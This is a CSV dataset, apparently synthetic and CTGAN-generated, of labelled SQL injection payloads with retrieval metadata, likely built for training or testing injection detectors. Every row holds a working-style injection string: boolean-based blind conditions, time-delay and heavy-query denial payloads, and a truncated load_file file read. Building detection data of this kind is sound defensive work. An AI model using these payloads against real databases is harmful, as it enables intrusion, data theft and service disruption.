id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean,"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",nearest_attack_euclidean,R003020,6.166569090367847
CTGAN_000002,attack,boolean,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'zxon' like 'zxon",nearest_attack_euclidean,R001788,4.981028774617567
CTGAN_000003,attack,boolean,"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""xmrq""  =  ""xmrq",nearest_attack_euclidean,R002680,5.873267202074355
CTGAN_000004,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R002468,4.710921904716349
CTGAN_000005,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R003098,3.7457169446392644
CTGAN_000006,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""%""  =  """,nearest_attack_euclidean,R002806,7.458229444181135
CTGAN_000007,attack,boolean,"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001346,5.73920578172253
CTGAN_000008,attack,boolean,"1'+  (  select lgkd where 7801  =  7801 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R002768,6.11983045069431
CTGAN_000009,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002997,5.0734989373775035
CTGAN_000010,attack,boolean,"1' in boolean mode  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000851,6.974735414513948
CTGAN_000011,attack,boolean,"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # miji",nearest_attack_euclidean,R002747,5.85075551618672
CTGAN_000012,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",nearest_attack_euclidean,R001624,4.950135960568101
CTGAN_000013,attack,boolean,"1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'",nearest_attack_euclidean,R002348,5.714580173717035
CTGAN_000014,attack,boolean,"-5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466",nearest_attack_euclidean,R000609,5.929850707891784
CTGAN_000015,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",nearest_attack_euclidean,R002243,5.324321036058958
CTGAN_000016,attack,boolean,"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002435,4.997080278197305
CTGAN_000017,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000176,6.564129984971848
CTGAN_000018,attack,boolean,"1""  )   where 3445  =  3445 and elt  (  1212  =  1254,1254  )  --",nearest_attack_euclidean,R001871,4.71292277852094
CTGAN_000019,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  5855  =  7142  )   then 1 else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,nearest_attack_euclidean,R003605,5.822470143860274
CTGAN_000020,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'eflk'  =  'eflk",nearest_attack_euclidean,R001252,7.2296858805873
CTGAN_000021,attack,boolean,"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- zvkh",nearest_attack_euclidean,R003256,3.874087082355998
CTGAN_000022,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R001294,7.469475621878141
CTGAN_000023,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000382,7.118943492697902
